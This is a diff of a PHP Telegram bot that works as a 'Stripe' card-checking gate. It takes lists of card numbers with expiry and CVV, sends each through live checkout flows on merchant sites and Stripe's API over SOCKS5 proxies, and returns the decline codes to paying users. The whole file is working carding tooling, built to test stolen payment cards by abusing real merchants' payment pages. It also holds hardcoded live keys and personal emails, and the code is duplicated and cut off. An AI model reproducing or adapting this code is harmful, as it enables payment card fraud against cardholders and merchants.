@@ -1,469 +1,159 @@
 <?php
 
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-ini_set('log_errors', TRUE);
-ini_set('error_log', 'errors.log');
-//=========RANK DETERMINE=========//
-
-$gate = "𝙎𝙏𝙍𝙄𝙋𝙀 𝘼𝙐𝙏𝙃";
-
-$currentDate = date('Y-m-d');
-$currentDate = date('Y-m-d');
-$rank = "FREE";
-$expiryDate = "0";
-
-$paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
-$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
-$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);
-
-if (in_array($userId, $owners)) {
-    $rank = "OWNER";
-    $expiryDate = "UNTIL DEAD";
-} else {
-    foreach ($paidUsers as $index => $line) {
-        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
-        if ($userIdFromFile == $userId) {
-            if ($userExpiryDate < $currentDate) {
-                unset($paidUsers[$index]); //
-                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
-                $freeUsers[] = $userId; // add to free users list
-                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
-            } else    $currentDate = date('Y-m-d');
-            $rank = "FREE";
-            $expiryDate = "0";
-
-            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
-            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
-            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);
-
-            if (in_array($userId, $owners)) {
-                $rank = "OWNER";
-                $expiryDate = "UNTIL DEAD";
-            } else {
-                foreach ($paidUsers as $index => $line) {
-                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
-                    if ($userIdFromFile == $userId) {
-                        if ($userExpiryDate < $currentDate) {
-                            unset($paidUsers[$index]);
-                            file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
-                            $freeUsers[] = $userId;
-                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
-                        } else {
-                            $rank = "PAID";
-                            $expiryDate = $userExpiryDate;
-                        }
-                    }
-                }
-            } {
-                $rank = "PAID";
-                $expiryDate = $userExpiryDate;
-            }
-        }
-    }
-}
-//=======RANK DETERMINE END=========//
-$update = json_decode(file_get_contents("php://input"), TRUE);
-$text = $update["message"]["text"];
-//========WHO CAN CHECK FUNC========//
-$r = "0";
-$gcm = "/vg";
-$r = rand(0, 100);
-//=====WHO CAN CHECK FUNC END======//
-$i = explode("|", $lista);
 function makearray($message){
     return explode("\n", $message);
 }
 
-if (preg_match('/^(\/vg|\.vg|!vg)/', $message)) {
-    $userid = $update['message']['from']['id'];
+if ($message == '.mass' or $message == '/mass' or $message == ',mass' or $message == '?mass' or $message == '!mass')
+{sendMessage($chatId, "   Gate Info - <b>%0A• STRIPE 10$ CHARGE - .mass || /mass || !mass || ,mass || ?mass %0A• Other Gates - /cmds </b> ", $message_id);exit();}
 
-    if (!checkAccess($userid)) {
-        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
-        exit();
-    }
+$cclist = preg_replace("/[^0-9|\n]/", "",$message);
+$array = explode("\n", $cclist);
+$arraylen = count($array);
+$new_array = [];
+foreach ($array as $res) {
 
-    $cclist = preg_replace("/[^0-9|\n]/", "",$text);
-    $array = explode("\n", $cclist);
-    $arraylen = count($array);
-    $new_array = [];
-    foreach ($array as $res) {
+#01. Req
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://tryhackme.com/subscriptions');
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+$headers = array(
+'content-type: application/x-www-form-urlencoded',
+'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+$curl1 = curl_exec($ch);
+$csrf = trim(strip_tags(getStr($curl1,'csrfToken = "','"')));
+$info = curl_getinfo($ch);
+$time11 = $info['total_time'];
+$time1 = substr_replace($time11, '',4);
 
+# 02 Req..
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://tryhackme.com/payment/stripe/buy-vouchers');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+$headers = array(
+'csrf-token: '.$csrf.'',);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'subs=1&months=1&email=abhays32109%40gmail.com&currency=usd');
+$curl2 = curl_exec($ch);
+$cs = trim(strip_tags(getStr($curl2,'sessionId":"','"')));
+$info = curl_getinfo($ch);
+$time22 = $info['total_time'];
+$time2 = substr_replace($time22, '',4);
 
-    $start_time = microtime(true);
+# 03 Req..
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+$headers = array(
+'',);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&billing_details[name]=Ajay+Singh&billing_details[email]=abhays32109%40gmail.com&billing_details[address][country]=IN&guid=NA&muid=NA&sid=NA&key=pk_live_KxmCxZNRJnRAnNAGdrXICd3a&payment_user_agent=stripe.js%2F32de06046%3B+stripe-js-v3%2F32de06046%3B+checkout');
+$curl3 = curl_exec($ch);
+$pid = trim(strip_tags(getStr($curl3,'"id": "','"')));
+$prsp1 = trim(strip_tags(getStr($curl3,'message": "','"')));
+$pdcode1 = trim(strip_tags(getStr($curl3,'decline_code": "','"')));
+$info = curl_getinfo($ch);
+$time33 = $info['total_time'];
+$time3 = substr_replace($time33, '',4);
 
-    $chatId = $update["message"]["chat"]["id"];
-    $message_id = $update["message"]["message_id"];
-    $keyboard = "";
-    $message = substr($message, 4);
-    $messageidtoedit1 = bot('sendmessage', [
-        'chat_id' => $chat_id,
-        'text' => "<b>Processing... </b>",
-        'parse_mode' => 'html',
-        'reply_to_message_id' => $message_id
-    ]);
-    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');
+# 04 Req..
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs.'/confirm');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+$headers = array(
+'',);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$pid.'&expected_amount=1000&last_displayed_line_item_group_details[subtotal]=1000&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_KxmCxZNRJnRAnNAGdrXICd3a');
+$curl4 = curl_exec($ch);
+$status = trim(strip_tags(getStr($curl4,'status": "','"')));
+$dcode = trim(strip_tags(getStr($curl4,'decline_code": "','"')));
+$messagee = trim(strip_tags(getStr($curl4,'"message": "','",')));
+$info = curl_getinfo($ch);
+$time44 = $info['total_time'];
+$time4 = substr_replace($time44, '',4);
+$time = ($time1+$time2+$time3+$time4);
 
-    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
-    $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
-    $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
-    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
-    $amt = '1';
-    if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
-        bot('editMessageText', [
-            'chat_id' => $chat_id,
-            'message_id' => $messageidtoedit,
-            'text' => "!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏! 𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣                                                  - <code>$gcm cc|mm|yy|cvv</code>\n𝙂𝘼𝙏𝙀𝙒𝘼𝙔  - <b>$gate</b>",
-            'parse_mode' => 'html',
-            'disable_web_page_preview' => 'true'
-        ]);
-        return;
-    };
-        if(strlen($ano) == '4'){
-          $an = substr($ano, 2);
-      }
-      else{
-        $an = $ano;
-      }
-          $amount = $amt * 100;
-    //------------Card info------------//
-    $lista = (''.$cc.'|'.$mes.'|'.$year.'|'.$cvv.'');
-  
-  $ch = curl_init();
-
-  $bin = substr($cc, 0, 6);
-
-  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    $ch = curl_init();
-
-    $bin = substr($cc, 0, 6);
-
-    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-    $bindata = curl_exec($ch);
-    $binna = json_decode($bindata, true);
-    $brand = $binna['scheme'];
-    $country = $binna['country']['name'];
-    $alpha2 = $binna['country']['alpha2'];
-    $emoji = $binna['country']['emoji'];
-    $type = $binna['type'];
-    $category = $binna['category'];
-    $bank = $binna['bank']['name'];
-    $url = $binna['bank']['url'];
-    $phone = $binna['bank']['phone'];
-    curl_close($ch);
-
-    $bank = "$bank";
-    $country = "$country $emoji ";
-    $bin = "$bin - ($alpha2) -[$emoji] ";
-    $bininfo = "$type - $brand - $category";
-    $url = "$url";
-    $type = strtoupper($type);
-  
- //==================[BIN LOOK-UP-END]======================//
-
-  bot('editMessageText', [
-            'chat_id' => $chat_id,
-            'message_id' => $messageidtoedit,
-            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
-- - - - - - - - - - - - - - - - - - -
-[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
-[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
-[×] 𝘽𝘼𝙉𝙆 ↯ $bank
-[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
-[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
-- - - - - - - - - - - - - - - - - - -
-|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
-|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
-          'parse_mode' => 'html',
-            'disable_web_page_preview' => 'true'
-        ]);
-  
-
-    //------------Card info------------//
-
-   
-
-    $proxie = null;
-    $pass = null;
-    $cookieFile = getcwd() . '/cookies.txt';
-
-    function getstr2($string, $start, $end)
+    if (empty($dcode)) 
     {
-        $str = explode($start, $string);
-        $str = explode($end, $str[1]);
-        return $str[0];
-    }
- # -------------------- [1 REQ] -------------------#
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'authority: catechdepot.com',
-        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language: es-ES,es;q=0.9',
-        'referer: https://catechdepot.com/shop/confirmation',
-        'sec-fetch-dest: document',
-        'sec-fetch-mode: navigate',
-        'sec-fetch-site: same-origin',
-        'sec-fetch-user: ?1',
-        'upgrade-insecure-requests: 1',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-    ]);
+        $dcode = $status;
+    }   
+          $i = "Card Details 💳 : $res%0AResult : $dcode";
+          $new_array[] = $i;
+        sendMessage($chatId, "$new_array[0]%0A$new_array[1]%0A$new_array[2]%0A$new_array[3]%0A$new_array[4]%0A$new_array[5]%0A$new_array[6]%0A$new_array[7]%0A$new_array[8]%0A$new_array[9]%0A$new_array[10]%0A$new_array[11]%0A$new_array[12]%0A$new_array[13]%0A$new_array[14]%0A$new_array[15]%0A$new_array[16]%0A$new_array[17]%0A$new_array[18]%0A$new_array[19]%0A$new_array[20]%0A$new_array[21]%0A$new_array[22]%0A$new_array[23]%0A$new_array[24]%0A$new_array[25]%0A$new_array[26]%0A$new_array[27]%0A$new_array[28]%0A$new_array[29]%0A$new_array[30]%0A$new_array[31]%0A$new_array[32]%0A$new_array[33]%0A$new_array[34]%0A$new_array[35]%0A$new_array[36]%0A$new_array[37]%0A$new_array[38]%0A$new_array[39]%0A$new_array[40]%0A$new_array[41]%0A$new_array[42]%0A$new_array[43]%0A$new_array[44]%0A$new_array[45]%0A$new_array[46]%0A$new_array[47]%0A$new_array[48]%0A$new_array[49]%0A$new_array[50]%0A$new_array[51]%0A$new_array[52]%0A$new_array[53]%0A$new_array[54]%0A$new_array[55]%0A$new_array[56]%0A$new_array[57]%0A$new_array[58]%0A$new_array[59]%0A$new_array[60]%0A$new_array[61]%0A$new_array[62]%0A$new_array[63]%0A$new_array[64]%0A$new_array[65]%0A$new_array[66]%0A$new_array[67]%0A$new_array[68]%0A$new_array[69]%0A$new_array[70]%0A$new_array[71]%0A$new_array[72]%0A$new_array[73]%0A$new_array[74]%0A$new_array[75]%0A$new_array[76]%0A$new_array[77]%0A$new_array[78]%0A$new_array[79]%0A$new_array[80]%0A$new_array[81]%0A$new_array[82]%0A$new_array[83]%0A$new_array[84]%0A$new_array[85]%0A$new_array[86]%0A$new_array[87]%0A$new_array[88]%0A$new_array[89]%0A$new_array[90]%0A$new_array[91]%0A$new_array[92]%0A$new_array[93]%0A$new_array[94]%0A$new_array[95]%0A$new_array[96]%0A$new_array[97]%0A$new_array[98]%0A$new_array[99]%0A$new_array[100]%0A$new_array[101]%0A", $message_id);
 
-    curl_setopt($ch, CURLOPT_PROXY, $proxie);
-    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
-    $r2 = curl_exec($ch);
-    curl_close($ch);
-
-    $cf = getstr($r2, 'csrf_token: "', '"');
-    echo "$cf--<br>";
-
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/cart/update');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'authority: catechdepot.com',
-        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language: es-ES,es;q=0.9',
-        'cache-control: max-age=0',
-        'content-type: application/x-www-form-urlencoded',
-        'origin: https://catechdepot.com',
-        'referer: https://catechdepot.com/led-flood-light-100-277-volt-5000k-knuckle-mount?category=185',
-        'sec-fetch-dest: document',
-        'sec-fetch-mode: navigate',
-        'sec-fetch-site: same-origin',
-        'sec-fetch-user: ?1',
-        'upgrade-insecure-requests: 1',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-        'accept-encoding: gzip',
-    ]);
-    curl_setopt($ch, CURLOPT_PROXY, $proxie);
-    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=' . $cf . '&product_id=78725&quantity=1&product_custom_attribute_values=%5B%5D&variant_values=334&no_variant_attribute_values=%5B%5D&add_qty=1&express=true');
-
-    bot('editMessageText', [
-            'chat_id' => $chat_id,
-            'message_id' => $messageidtoedit,
-            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
-- - - - - - - - - - - - - - - - - - -
-[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
-[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
-[×] 𝘽𝘼𝙉𝙆 ↯ $bank
-[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
-[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
-- - - - - - - - - - - - - - - - - - -
-|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
-|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
-          'parse_mode' => 'html',
-            'disable_web_page_preview' => 'true'
-        ]);
-  
-    $r = curl_exec($ch);
-    curl_close($ch);
-
-    echo "r_ $r<br>";
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/shop/address');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'authority: catechdepot.com',
-        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language: es-ES,es;q=0.9',
-        'cache-control: max-age=0',
-        'content-type: application/x-www-form-urlencoded',
-        'origin: https://catechdepot.com',
-        'referer: https://catechdepot.com/shop/address',
-
-        'sec-fetch-dest: document',
-        'sec-fetch-mode: navigate',
-        'sec-fetch-site: same-origin',
-        'sec-fetch-user: ?1',
-        'upgrade-insecure-requests: 1',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-
-    ]);
-    curl_setopt($ch, CURLOPT_PROXY, $proxie);
-    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=jhin+vega&email=josewers20%40gmail.com&phone=9703878998&street=street+212&street2=&city=new+york&zip=10080&country_id=233&state_id=35&csrf_token=' . $cf . '&submitted=1&partner_id=186&callback=&field_required=phone%2Cname');
-
-    $rz = curl_exec($ch);
-    curl_close($ch);
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'authority: api.stripe.com',
-        'accept: application/json',
-        'accept-language: es-ES,es;q=0.9',
-        'content-type: application/x-www-form-urlencoded',
-        'origin: https://js.stripe.com',
-        'referer: https://js.stripe.com/',
-        'sec-fetch-dest: empty',
-        'sec-fetch-mode: cors',
-        'sec-fetch-site: same-site',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-
-    ]);
-    curl_setopt($ch, CURLOPT_PROXY, $proxie);
-    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&guid=41936ddc-a8b5-4b0d-97a7-d7dd5136062e715399&muid=849631d5-81c7-47e1-87ea-91b4b92af8c1870d68&sid=03283b22-15d4-4227-8a27-e7fe7394968ad9bf7a&pasted_fields=number&payment_user_agent=stripe.js%2F85b73043af%3B+stripe-js-v3%2F85b73043af%3B+card-element&referrer=https%3A%2F%2Fcatechdepot.com&time_on_page=15189&key=pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0');
-
-    $rx = curl_exec($ch);
-    curl_close($ch);
-
-    $j = json_decode($rx, true);
-    $id = $j['id'];
-  
-  bot('editMessageText', [
-            'chat_id' => $chat_id,
-            'message_id' => $messageidtoedit,
-            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
-- - - - - - - - - - - - - - - - - - -
-[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
-[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
-[×] 𝘽𝘼𝙉𝙆 ↯ $bank
-[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
-[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
-- - - - - - - - - - - - - - - - - - -
-|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
-|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
-          'parse_mode' => 'html',
-            'disable_web_page_preview' => 'true'
-        ]);
-
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://catechdepot.com/payment/stripe/s2s/create_json_3ds');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'authority: catechdepot.com',
-        'accept: application/json, text/javascript, */*; q=0.01',
-        'accept-language: es-ES,es;q=0.9',
-        'content-type: application/json',
-        'origin: https://catechdepot.com',
-        'referer: https://catechdepot.com/shop/payment',
-        'sec-fetch-dest: empty',
-        'sec-fetch-mode: cors',
-        'sec-fetch-site: same-origin',
-        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-        'x-requested-with: XMLHttpRequest',
-    ]);
-    curl_setopt($ch, CURLOPT_PROXY, $proxie);
-    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
-    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
-    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"jsonrpc":"2.0","method":"call","params":{"data_set":"/payment/stripe/s2s/create_json_3ds","acquirer_id":"9","stripe_publishable_key":"pk_live_51I70wzLO8ShkwzuG1onxNR1mbywAZi9aXRo0BWWPnQIDbpZMsbZdL15TrxAszaUQub0IamcJ6jSawoOfdrTWeHwG00g1nv28B0","currency_id":"","return_url":"/shop/payment/validate","partner_id":"186","csrf_token":"' . $cf . '","payment_method":"' . $id . '"},"id":364109924}');
-
-    $rx = curl_exec($ch);
-
-    curl_close($ch);
-
-
-    unlink($cookieFile);
-
-    $msg = getstr2($rx, ', "message": " ','"');
-
-
-  bot('editMessageText', [
-            'chat_id' => $chat_id,
-            'message_id' => $messageidtoedit,
-            'text' => "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
-- - - - - - - - - - - - - - - - - - -
-[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
-[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
-[×] 𝘽𝘼𝙉𝙆 ↯ $bank
-[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
-[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
-- - - - - - - - - - - - - - - - - - -
-|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
-|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>",
-          'parse_mode' => 'html',
-            'disable_web_page_preview' => 'true'
-        ]);
-
-    $end_time = microtime(true);
-    $time = number_format($end_time - $start_time, 2);
-
-    ////////--[Responses]--////////
-
-    $i = "Card Details : $res%0AResults : $es";
-    $new_array[] = $i;
-    sendMessage($chatId, "$new_array[0]%0A$new_array[1]%0A$new_array[2]%0A$new_array[3]%0A$new_array[4]%0A$new_array[5]%0A$new_array[6]%0A$new_array[7]%0A$new_array[8]%0A$new_array[9]%0A$new_array[10]%0A$new_array[11]%0A$new_array[12]%0A$new_array[13]%0A$new_array[14]%0A$new_array[15]%0A$new_array[16]%0A$new_array[17]%0A$new_array[18]%0A$new_array[19]%0A$new_array[20]%0A$new_array[21]%0A$new_array[22]%0A$new_array[23]%0A$new_array[24]%0A$new_array[25]%0A$new_array[26]%0A$new_array[27]%0A$new_array[28]%0A$new_array[29]%0A$new_array[30]%0A$new_array[31]%0A$new_array[32]%0A$new_array[33]%0A$new_array[34]%0A$new_array[35]%0A$new_array[36]%0A$new_array[37]%0A$new_array[38]%0A$new_array[39]%0A$new_array[40]%0A$new_array[41]%0A$new_array[42]%0A$new_array[43]%0A$new_array[44]%0A$new_array[45]%0A$new_array[46]%0A$new_array[47]%0A$new_array[48]%0A$new_array[49]%0A$new_array[50]%0A$new_array[51]%0A$new_array[52]%0A$new_array[53]%0A$new_array[54]%0A$new_array[55]%0A$new_array[56]%0A$new_array[57]%0A$new_array[58]%0A$new_array[59]%0A$new_array[60]%0A$new_array[61]%0A$new_array[62]%0A$new_array[63]%0A$new_array[64]%0A$new_array[65]%0A$new_array[66]%0A$new_array[67]%0A$new_array[68]%0A$new_array[69]%0A$new_array[70]%0A$new_array[71]%0A$new_array[72]%0A$new_array[73]%0A$new_array[74]%0A$new_array[75]%0A$new_array[76]%0A$new_array[77]%0A$new_array[78]%0A$new_array[79]%0A$new_array[80]%0A$new_array[81]%0A$new_array[82]%0A$new_array[83]%0A$new_array[84]%0A$